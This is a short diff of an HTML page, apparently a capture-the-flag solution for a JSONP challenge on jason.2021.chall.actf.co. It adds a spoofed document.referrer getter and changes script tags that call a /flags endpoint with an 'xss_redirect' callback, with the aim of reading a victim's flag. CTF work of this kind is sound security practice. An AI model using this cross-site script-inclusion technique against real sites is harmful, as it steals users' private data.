@@ -24,10 +24,13 @@ layout: xss
     function processWeatherCallback(data) {
         console.log("DATA" + data);
     }
+    window.document.__defineGetter__('referrer', function () {
+        return "https://jason.2021.chall.actf.co/";
+    });
     var script = document.createElement('script');
     script.src = 'https://jason.2021.chall.actf.co/flags?callback=processWeatherCallback';
     script.referrerPolicy = "no-referrer";
     document.body.appendChild(script);
 </script>
 
-<script src="https://jason.2021.chall.actf.co/flags?callback=xss_redirect" referrerpolicy="no-referrer"></script>
+<script src="https://jason.2021.chall.actf.co/flags?callback=xss_redirect" ></script>
